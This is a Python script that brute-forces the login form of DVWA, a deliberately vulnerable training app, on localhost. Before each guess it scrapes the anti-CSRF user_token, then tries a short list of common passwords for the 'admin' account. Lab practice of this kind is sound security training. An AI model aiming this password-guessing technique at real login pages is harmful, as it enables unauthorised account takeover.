import requests
from bs4 import BeautifulSoup

base_url = "http://127.0.0.1/dvwa"
brute_url = base_url + "/vulnerabilities/brute/"

session = requests.Session()

cookies = {
    "security": "high",
    "PHPSESSID": "你的PHPSESSID"
}

passwords = [
    "123456",
    "admin",
    "password",
    "qwerty",
    "12345678"
]

username = "admin"

def get_token():
    r = session.get(brute_url, cookies=cookies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]
    return token

for password in passwords:
    token = get_token()

    params = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
    }

    r = session.get(brute_url, params=params, cookies=cookies)

    print(f"Trying: {username}:{password}")

    if "Welcome to the password protected area" in r.text:
        print(f"[+] Found password: {password}")
        break
    elif "Username and/or password incorrect" in r.text:
        print("[-] Failed")
    else:
        print("[?] Unknown response")